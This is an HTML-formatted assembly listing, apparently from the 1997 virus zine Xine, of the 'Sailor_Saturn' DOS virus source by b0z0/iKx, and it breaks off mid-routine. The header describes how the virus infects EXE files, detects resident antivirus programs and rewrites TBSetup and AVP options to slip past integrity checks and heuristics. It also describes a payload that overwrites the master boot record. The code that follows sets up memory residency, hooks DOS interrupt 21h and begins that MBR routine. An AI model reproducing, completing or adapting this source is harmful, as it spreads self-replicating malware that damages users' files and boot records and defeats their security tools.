<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>sat.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #3 - Phile 211 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">



</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Name    : Sailor_Saturn</span><span class="sc0">
</span><span class="sc1">; Virus Author  : b0z0/iKx</span><span class="sc0">
</span><span class="sc1">; Origin        : Padania, Mid/Late 1997</span><span class="sc0">
</span><span class="sc1">; Target        : EXE files</span><span class="sc0">
</span><span class="sc1">; Poly          : SMPE v0.3</span><span class="sc0">
</span><span class="sc1">; Compiling     : TASM 3.0 prefeered</span><span class="sc0">
</span><span class="sc1">;                       TASM /m5 /l sat.asm</span><span class="sc0">
</span><span class="sc1">;                       TLINK sat</span><span class="sc0">
</span><span class="sc1">; Goodies       :</span><span class="sc0">
</span><span class="sc1">;               - Scans MCBs for resident antiviruses</span><span class="sc0">
</span><span class="sc1">;               - Fast infection when some programs are run.</span><span class="sc0">
</span><span class="sc1">;                       The fast infection is done on Findfirst/Findnext</span><span class="sc0">
</span><span class="sc1">;                       (4Eh/4Fh) calls. The virus will of course correct</span><span class="sc0">
</span><span class="sc1">;                       the lenght of the newly infected files in the DTA,</span><span class="sc0">
</span><span class="sc1">;                       so there won't be any shitty corruption or alarm</span><span class="sc0">
</span><span class="sc1">;                       from packagers or other stuff. The programs when</span><span class="sc0">
</span><span class="sc1">;                       Sailor_Saturn becames a very-fast infector are:</span><span class="sc0">
</span><span class="sc1">;                          Packagers    : PKZIP, ARJ, LHA, RAR</span><span class="sc0">
</span><span class="sc1">;                          Others       : TBSetup (so every file added to</span><span class="sc0">
</span><span class="sc1">;                                         the ANTI-VIR.DAT will be infected</span><span class="sc0">
</span><span class="sc1">;                                         and the data in the CRC file will</span><span class="sc0">
</span><span class="sc1">;                                         be correct... thanx TBSetup :)) ),</span><span class="sc0">
</span><span class="sc1">;                                         XCOPY (usual tool for copying under</span><span class="sc0">
</span><span class="sc1">;                                         a lot of DOS flavours, quite used),</span><span class="sc0">
</span><span class="sc1">;                                         BACKUP (or any file starting with</span><span class="sc0">
</span><span class="sc1">;                                         BACK, usual DOS backupping program)</span><span class="sc0">
</span><span class="sc1">;               - Modifies TBSetup command line options:</span><span class="sc0">
</span><span class="sc1">;                       If the users tries to just update new files to</span><span class="sc0">
</span><span class="sc1">;                       prevent storing the CRC of infected ones (using</span><span class="sc0">
</span><span class="sc1">;                       the no or newonly commands) the virus will delete</span><span class="sc0">
</span><span class="sc1">;                       that command line parameters with spaces. This will</span><span class="sc0">
</span><span class="sc1">;                       be done also if the user tries to use the pause (or</span><span class="sc0">
</span><span class="sc1">;                       pa) command that pauses after every full screen.</span><span class="sc0">
</span><span class="sc1">;                       Randomly (with a 1:8 probability) the bad commands</span><span class="sc0">
</span><span class="sc1">;                       (pa, no...) are substituted with a 'ad' parameter</span><span class="sc0">
</span><span class="sc1">;                       that orders to TBSetup to scan (ie. infect :) ) all</span><span class="sc0">
</span><span class="sc1">;                       the disk drives on the system ]8)</span><span class="sc0">
</span><span class="sc1">;               - Modifies AVP and AVPLITE line options setting the /M and /H</span><span class="sc0">
</span><span class="sc1">;                 options, this is don't scan memory and disable heuristics</span><span class="sc0">
</span><span class="sc1">;               - Doesn't infect many antiviruses</span><span class="sc0">
</span><span class="sc1">;               - Doesn't infect files with digits in the filename</span><span class="sc0">
</span><span class="sc1">;               - Some other usual antibait checks</span><span class="sc0">
</span><span class="sc1">;               - Nothing special, the 'good stuff' should be in the poly</span><span class="sc0">
</span><span class="sc1">;               - Payload with graphic effect on 14th sept. The original MBR</span><span class="sc0">
</span><span class="sc1">;                 will be substituted with one displaying the Padanian flag.</span><span class="sc0">
</span><span class="sc1">;                 If user will be smart enough, the original MBR will be</span><span class="sc0">
</span><span class="sc1">;                 restored and the user let to continue his work, check it</span><span class="sc0">
</span><span class="sc1">;                 out! :) The payload is done to say happy birthday to</span><span class="sc0">
</span><span class="sc1">;                 Padania (that born officially the 14th september 1997)</span><span class="sc0">
</span><span class="sc1">; Poly notes    :</span><span class="sc0">
</span><span class="sc1">;               - Creates really a lot of different garbage (math ops, ints,</span><span class="sc0">
</span><span class="sc1">;                 calls, reg stuff, pushes, pops, mem references, cmpares...</span><span class="sc0">
</span><span class="sc1">;                 give it a look) with various operand size and type</span><span class="sc0">
</span><span class="sc1">;               - Encryption using bytes, words and dwords</span><span class="sc0">
</span><span class="sc1">;               - Encryption using ROL/ROR with stable or changing rotations</span><span class="sc0">
</span><span class="sc1">;                 number</span><span class="sc0">
</span><span class="sc1">;               - Encryption using ADD/SUB/XOR with fixed or changing</span><span class="sc0">
</span><span class="sc1">;                 encryption value (changing enc value not for byte</span><span class="sc0">
</span><span class="sc1">;                 operations). The change to the encryption value will be</span><span class="sc0">
</span><span class="sc1">;                 done with an ADD/SUB/XOR with a random value or with a</span><span class="sc0">
</span><span class="sc1">;                 stable ROR/ROL of 1</span><span class="sc0">
</span><span class="sc1">;               - Encryption can be done from the start to the end or in the</span><span class="sc0">
</span><span class="sc1">;                 reverse way</span><span class="sc0">
</span><span class="sc1">;               - Some garbage instruction can be encrypted</span><span class="sc0">
</span><span class="sc1">;               - Can use all the pointer registers as pointers and all the</span><span class="sc0">
</span><span class="sc1">;                 registers except AX for counters and for key holders</span><span class="sc0">
</span><span class="sc1">;               - Generates a lot of different variants of loops and</span><span class="sc0">
</span><span class="sc1">;                 comparations for counters and such</span><span class="sc0">
</span><span class="sc1">;               - Some anti-emulation traps</span><span class="sc0">
</span><span class="sc1">;               - Quite fast poly, not too bigger than the previous versions</span><span class="sc0">
</span><span class="sc1">;                 even if it has plenty new features</span><span class="sc0">
</span><span class="sc1">;               - Should generate very variable size decryptors (from less than</span><span class="sc0">
</span><span class="sc1">;                 hundred bytes also up to 15kb decryptors, of course in some</span><span class="sc0">
</span><span class="sc1">;                 largest cases). Also big decryptors should not get tooooo</span><span class="sc0">
</span><span class="sc1">;                 much time to execute (except under win and such stuff) but</span><span class="sc0">
</span><span class="sc1">;                 should be quite bitching for AVs.</span><span class="sc0">
</span><span class="sc1">;               - Generate a few samples to see what it does, I already</span><span class="sc0">
</span><span class="sc1">;                 forgot what I wrote ;-)</span><span class="sc0">
</span><span class="sc1">;               - Maybe this is the last version of SMPE. I think that the</span><span class="sc0">
</span><span class="sc1">;                 poly itself is quite ok, the problem is that this type of</span><span class="sc0">
</span><span class="sc1">;                 poly conception is old, so I should not work on it too</span><span class="sc0">
</span><span class="sc1">;                 much in the future.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus is dedicated to all the ppl in Padania. Padania libera!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">saturn</span><span class="sc0">          </span><span class="sc9">segment</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">saturn</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">saturn</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">saturn</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">saturn_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_offset</span><span class="sc0">
</span><span class="sc5">get_offset</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_offset</span><span class="sc0">    </span><span class="sc1">; bp has delta offset</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">original_cs</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; restore host cs:ip</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1875h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; residency check</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7975h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">return_old_noseg</span><span class="sc0">

</span><span class="sc5">not_present</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                  </span><span class="sc1">; get list of lists</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; first mcb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">next_mcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mem_strings</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">; ax &lt;- ds:[08]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">mem_string_num</span><span class="sc0">
</span><span class="sc5">mem_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">return_old</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">mem_loop</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; al = ds:[0]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mem_string_num</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                                                </span><span class="sc1">; last mcb ? ('Z')</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">last_mcb</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; on next mcb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_mcb</span><span class="sc0">
</span><span class="sc5">last_mcb</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">saturn_mem_para</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; virus paras + one for mcb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; ax = saturn_mem_para</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">    </span><span class="sc1">; last block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">8h</span><span class="sc0"> </span><span class="sc1">; owner dos</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc12">'SOD'</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; virus memory block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">saturn_mem_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; copy the virus to mem</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                </span><span class="sc1">; save int21h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vir_21handler</span><span class="sc0"> </span><span class="sc1">; hook int 21h in a winzooz</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                </span><span class="sc1">; compatible way</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">],</span><span class="sc13">'\'      ; fastinf init so
</span><span class="sc0">                                                        </span><span class="sc1">; inf routines are</span><span class="sc0">
                                                        </span><span class="sc1">; the same as for 4bh</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                  </span><span class="sc1">; get date</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">090eh</span><span class="sc0">                </span><span class="sc1">; the 14th of september?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">return_old</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">payload_activation</span><span class="sc0">

</span><span class="sc5">return_old</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">return_old_noseg</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">prefetch_jump</span><span class="sc0">           </span><span class="sc1">; must be quite sure that</span><span class="sc0">
                                                </span><span class="sc1">; later cs:ip pushes won't</span><span class="sc0">
                                                </span><span class="sc1">; be prefetched</span><span class="sc0">

</span><span class="sc5">vir_name</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Sailor_Saturn'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vir_auth</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-b0z0/iKx-'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">original_ss</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">z_char</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Z'</span><span class="sc0">
</span><span class="sc5">original_sp</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">

</span><span class="sc5">mem_string_num</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; number of mem strings</span><span class="sc0">
</span><span class="sc5">file_string_num</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">10</span><span class="sc0">                      </span><span class="sc1">; number of file strings</span><span class="sc0">
</span><span class="sc5">mem_strings</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'TB'</span><span class="sc4">,</span><span class="sc12">'NE'</span><span class="sc4">,</span><span class="sc12">'VI'</span><span class="sc4">,</span><span class="sc12">'NA'</span><span class="sc4">,</span><span class="sc12">'F-'</span><span class="sc4">,</span><span class="sc12">'AV'</span><span class="sc4">,</span><span class="sc12">'FI'</span><span class="sc4">,</span><span class="sc12">'MS'</span><span class="sc4">,</span><span class="sc12">'SC'</span><span class="sc4">,</span><span class="sc12">'CO'</span><span class="sc0">
</span><span class="sc5">last_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NL'</span><span class="sc0">                    </span><span class="sc1">; this word will contain the</span><span class="sc0">
                                                </span><span class="sc1">; first two letters of the</span><span class="sc0">
                                                </span><span class="sc1">; last infected filename.</span><span class="sc0">
                                                </span><span class="sc1">; Since two quite equal named</span><span class="sc0">
                                                </span><span class="sc1">; files should be a bait</span><span class="sc0">
</span><span class="sc5">back_there</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; zero regs</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">                             </span><span class="sc1">; set original SS:SP</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">original_ss</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">original_cs</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">original_sp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">original_cs</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">                     </span><span class="sc1">; push cs</span><span class="sc0">
</span><span class="sc5">original_cs</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0fff0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">68h</span><span class="sc0">                     </span><span class="sc1">; push ip</span><span class="sc0">
</span><span class="sc5">original_ip</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">; go to orig cs:ip</span><span class="sc0">


</span><span class="sc5">simulate21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">old_21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">payload_activation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; DS = ES = virus block in mem</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">saturn_stack</span><span class="sc0">  </span><span class="sc1">; we use code and stack from</span><span class="sc0">
                                                </span><span class="sc1">; the virus just loaded in mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; read the MBR to our mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
